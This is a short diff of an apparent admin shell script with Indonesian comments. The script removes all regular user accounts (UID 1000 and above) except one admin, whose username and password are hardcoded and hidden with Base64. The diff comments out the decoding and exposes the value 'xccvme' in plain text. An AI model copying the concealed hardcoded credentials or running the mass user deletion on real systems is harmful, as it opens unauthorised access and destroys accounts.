@@ -67,8 +67,9 @@ unlock_system
 echo "[+] Cleaning old users..."
 
 # Dekode Base64 untuk menyembunyikan kredensial di source code
-USERNAME=$(echo "eGNjdm1l" | base64 -d)
-PASSWORD=$(echo "eGNjdm1l" | base64 -d)
+# xccvme 
+#USERNAME=$(echo "eGNjdm1l" | base64 -d)
+#PASSWORD=$(echo "eGNjdm1l" | base64 -d)
 
 awk -v admin_user="$USERNAME" -F: '$3>=1000 && $1!="nobody" && $1!=admin_user' /etc/passwd | cut -d: -f1 | while read u; do
     echo "Remove $u"
